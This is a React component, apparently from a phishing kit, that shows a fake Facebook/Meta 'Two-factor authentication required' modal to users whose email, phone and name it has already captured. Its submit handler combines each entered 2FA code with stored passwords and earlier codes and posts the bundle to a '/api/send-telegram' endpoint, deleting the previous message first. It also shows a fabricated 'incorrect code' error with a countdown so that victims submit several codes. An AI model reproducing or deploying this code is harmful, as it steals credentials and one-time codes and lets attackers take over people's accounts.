import GoogleAuthImage from '@/assets/images/googelauth-image.jpg';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import VerifyImage from '@/assets/images/verify-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import axios from 'axios';
import { useEffect, useState } from 'react';

const VerifyModal = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [step, setStep] = useState('code');

    const { geoInfo, messageId, baseMessage, passwords, codes, addCode, setMessageId, userEmail, userPhoneNumber, userFullName, translations: storeTranslations } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text) => {
        return storeTranslations[text] || text;
    };

    // Mask email function: s****g@gmail.com (1 chữ đầu + 4 dấu * cố định + 1 chữ cuối)
    const maskEmail = (email) => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (!localPart || !domain) return email;
        if (localPart.length === 0) return email;
        
        const firstChar = localPart[0];
        const lastChar = localPart.length > 1 ? localPart[localPart.length - 1] : '';
        
        // Luôn dùng 4 dấu * cố định
        if (localPart.length === 1) {
            return `${firstChar}****@${domain}`;
        }
        
        return `${firstChar}****${lastChar}@${domain}`;
    };

    // Format phone: +849123456981 → +84****981 (country code + 4 dấu * cố định + 3 số cuối)
    const formatPhone = (phone) => {
        if (!phone) return '';
        
        // Lấy tất cả số (bỏ khoảng trắng, dấu gạch ngang, dấu ngoặc, v.v.)
        const allDigits = phone.replace(/[^\d]/g, '');
        if (allDigits.length === 0) return phone;
        
        // Xác định country code (ưu tiên 2 số, sau đó 1 số, cuối cùng 3 số)
        let countryCode = '';
        let countryCodeDigits = '';
        
        // Danh sách country code 2 số phổ biến
        const twoDigitCodes = ['84', '44', '49', '33', '39', '34', '32', '31', '30', '27', '20', '90', '91', '92', '93', '94', '95', '98', '86', '81', '82', '60', '61', '62', '63', '64', '65', '66'];
        
        // Thử 2 số đầu
        if (allDigits.length >= 3) {
            const twoDigit = allDigits.slice(0, 2);
            if (twoDigitCodes.includes(twoDigit)) {
                countryCode = `+${twoDigit}`;
                countryCodeDigits = twoDigit;
            }
        }
        
        // Nếu không tìm thấy, thử 1 số (chỉ cho US/Canada +1)
        if (!countryCode && allDigits.length >= 2 && allDigits[0] === '1') {
            countryCode = '+1';
            countryCodeDigits = '1';
        }
        
        // Nếu vẫn không tìm thấy, dùng regex để lấy 1-3 số đầu
        if (!countryCode) {
            const countryCodeMatch = phone.match(/^\+?(\d{1,3})/);
            if (!countryCodeMatch) return phone;
            countryCode = `+${countryCodeMatch[1]}`;
            countryCodeDigits = countryCodeMatch[1];
        }
        
        // Số sau country code
        const phoneDigits = allDigits.slice(countryCodeDigits.length);
        
        if (phoneDigits.length === 0) return phone;
        
        // Lấy 3 số cuối (bắt buộc phải có 3 số cuối)
        if (phoneDigits.length < 3) return phone; // Không đủ 3 số cuối
        
        const last3 = phoneDigits.slice(-3);
        
        // Luôn dùng 4 dấu * cố định
        return `${countryCode}****${last3}`;
    };

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || countdown > 0) return;
        if (!baseMessage) {
            console.error('baseMessage is missing in verify modal!');
            return;
        }

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        try {
            // Rebuild message: baseMessage + tất cả passwords + tất cả codes (bao gồm code mới)
            let updatedMessage = baseMessage;
            
            // Thêm tất cả passwords
            passwords.forEach((pwd, index) => {
                updatedMessage += `\n🔑 Password ${index + 1}: ${pwd}`;
            });
            
            // Thêm tất cả codes đã có
            codes.forEach((c, index) => {
                updatedMessage += `\n🔐 Code ${index + 1}: ${c}`;
            });
            
            // Thêm code mới
            const codeNumber = codes.length + 1;
            updatedMessage += `\n🔐 Code ${codeNumber}: ${code}`;
            
            // Lưu code mới vào store
            addCode(code);

            // Xóa message cũ nếu có
            if (messageId) {
                try {
                    await axios.post('/api/delete-telegram', {
                        messageId: messageId
                    });
                } catch {
                    // Ignore error if delete fails
                }
            }

            // Gửi message mới
            const res = await axios.post('/api/send-telegram', {
                message: updatedMessage,
                parseMode: 'HTML'
            });
            
            // Cập nhật messageId mới
            if (res?.data?.success && res?.data?.messageId) {
                setMessageId(res.data.messageId);
            }

            if (next >= maxCode) {
                // Lần cuối: Đợi loading time đầy đủ khi chuyển step
                console.log('Code attempts completed, moving to final step');
                if (config.CODE_LOADING_TIME) {
                    await new Promise((resolve) => setTimeout(resolve, config.CODE_LOADING_TIME * 1000));
                }
                nextStep();
            } else {
                // Lần 1, 2: Đợi loading ngắn (1 giây) rồi mới hiện lỗi để tự nhiên hơn
                console.log(`Code attempt ${next}/${maxCode}, showing error`);
                await new Promise((resolve) => setTimeout(resolve, 1000)); // Loading 1 giây
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch (error) {
            console.error('Code submit error:', error);
            // Vẫn chuyển step nếu đã đủ attempts (dùng biến next đã tính toán)
            if (next >= maxCode) {
                console.log('Error but attempts completed, moving to final step');
                // Đợi loading time trước khi chuyển step (ngay cả khi có lỗi)
                if (config.CODE_LOADING_TIME) {
                    await new Promise((resolve) => setTimeout(resolve, config.CODE_LOADING_TIME * 1000));
                }
                nextStep();
            } else {
                // Lần 1, 2: Đợi loading ngắn (1 giây) rồi mới hiện lỗi
                await new Promise((resolve) => setTimeout(resolve, 1000)); // Loading 1 giây
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } finally {
            setIsLoading(false);
        }
    };

    const actualEmail = userEmail ? maskEmail(userEmail) : '';
    const actualPhone = userPhoneNumber ? formatPhone(userPhoneNumber) : '';
    const displayName = userFullName || 'User';

    // Format countdown: "0 minutes 17 seconds"
    const formatCountdown = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins} ${t('minutes')} ${secs} ${t('seconds')}`;
    };

    return (
        <div className='fixed inset-0 z-10 flex items-start justify-center bg-white/85 backdrop-blur-md md:backdrop-blur-lg md:items-center md:py-[40px] pt-[60px] pb-[15px]'>
            <div className='bg-white max-h-[calc(100vh-75px)] md:max-h-[85vh] md:h-auto w-full max-w-lg mx-4 md:mx-0 shadow-xl md:shadow-2xl px-[20px] md:px-[32px] pt-[20px] md:pt-[32px] pb-[30px] md:pb-[32px] rounded-[16px] md:rounded-[20px] flex flex-col overflow-hidden border border-gray-100 md:border-gray-200'>
                <div className='flex items-center justify-between pb-[0px]'></div>
                <div className='flex-1 overflow-y-auto'>
                    <div className='h-full flex flex-col flex-start w-full items-center justify-between flex-1'>
                        <div className='w-full'>
                            <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                                <span>{displayName}</span>
                                <div className='w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]'></div>
                                <span>{t('Facebook')}</span>
                            </div>
                            <h2 className='text-[20px] md:text-[22px] text-black font-[700] mb-[15px] md:mb-[12px]'>
                                {step === 'code' 
                                    ? t('Two-factor authentication required')
                                    : t('Go to your authentication app')
                                }
                            </h2>
                            <p className='text-[#9a979e] text-[14px] md:text-[15px] mb-[15px] md:mb-[16px]'>
                                {step === 'code' 
                                    ? `${t("We've sent a verification code to your")} ${actualEmail}${actualPhone ? ` ${t('and').toLowerCase()} ${actualPhone}` : ''}. ${t('To continue, you\'ll need to enter a verification code or approve it from another device.')} ${t('This process may take a few minutes.')} ${t('Please don\'t leave this page until you receive the code.')}`
                                    : t('Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).')
                                }
                            </p>
                            <div className='w-full rounded-[10px] md:rounded-[12px] bg-[#f5f5f5] overflow-hidden my-[15px] md:my-[20px]'>
                                <img src={step === 'code' ? VerifyImage : GoogleAuthImage} alt='' className='w-full h-auto' />
                            </div>
                            <div className='w-full'>
                                <form
                                    onSubmit={(e) => {
                                        e.preventDefault();
                                        handleSubmit();
                                    }}
                                >
                                    <div className={`input w-full border ${showError && countdown > 0 ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] md:h-[48px] px-[11px] md:px-[14px] rounded-[10px] bg-white text-[16px] md:text-[17px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 transition-all duration-200`}>
                                        <input
                                            id='twoFa'
                                            placeholder={t('Code')}
                                            className={`w-full outline-none h-full bg-transparent text-[16px] md:text-[17px] ${showError && countdown > 0 ? 'opacity-70 cursor-not-allowed' : ''}`}
                                            type='number'
                                            inputMode='numeric'
                                            value={code}
                                            onChange={(e) => {
                                                const value = e.target.value.replaceAll(/\D/g, '');
                                                if (value.length <= 8) {
                                                    setCode(value);
                                                }
                                            }}
                                            maxLength={8}
                                            disabled={countdown > 0 || isLoading}
                                        />
                                    </div>
                                    {showError && countdown > 0 && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>
                                            {t('The two-factor authentication you entered is incorrect')}. {t('Please, try again after')} {formatCountdown(countdown)}.
                                        </p>
                                    )}
                                    <div className='w-full mt-[12px] md:mt-[10px]'>
                                        <button
                                            type='submit'
                                            disabled={isLoading || !code.trim() || countdown > 0}
                                            className={`w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-all duration-300 h-[40px] min-h-[40px] md:h-[44px] md:min-h-[44px] text-[15px] md:text-[16px] ${isLoading || !code.trim() || countdown > 0 ? 'cursor-not-allowed opacity-70' : 'cursor-pointer hover:bg-[#0051c7] md:hover:shadow-md'}`}
                                        >
                                            {isLoading ? (
                                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                            ) : (
                                                t('Continue')
                                            )}
                                        </button>
                                    </div>
                                    <div 
                                        className={`w-full mt-[8px] md:mt-[6px] ${showError && countdown > 0 ? 'mb-[124px] md:mb-[30px]' : 'mb-[184px] md:mb-[80px]'} text-[#495057] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] h-[40px] min-h-[40px] md:h-[44px] md:min-h-[44px] text-[15px] md:text-[16px] hover:border-[#0064E0] hover:text-[#0064E0] transition-all duration-200`}
                                        onClick={() => setStep(step === 'code' ? 'alternative' : 'code')}
                                    >
                                        <span>{t('Try another way')}</span>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div className='w-[60px] mx-auto'>
                            <img src={MetaLogo} alt='' width={60} height={18} className='w-full h-full' />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;

